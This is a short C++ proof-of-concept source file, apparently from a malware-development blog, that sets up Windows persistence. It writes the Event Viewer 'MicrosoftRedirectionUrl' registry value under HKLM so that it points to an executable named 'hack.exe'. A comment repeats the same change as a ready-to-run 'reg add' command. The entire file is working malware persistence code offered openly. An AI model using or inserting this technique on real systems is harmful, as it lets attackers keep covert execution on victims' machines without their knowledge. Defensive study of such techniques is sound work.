/*
pers.cpp
windows persistence via
replace event viewer help link
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/10/09/malware-pers-14.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // event viewer
  const char* app = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer";

  // evil app
  const char* exe = "file://Z:\\2022-10-09-malware-pers-14\\hack.exe";

  // app
  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)app, 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // update registry key value
    // reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Event Viewer" /v "MicrosoftRedirectionUrl" /t REG_SZ /d "file://...\hack.exe" /f
    RegSetValueEx(hkey, (LPCSTR)"MicrosoftRedirectionUrl", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
    RegCloseKey(hkey);
  }

  return 0;
}
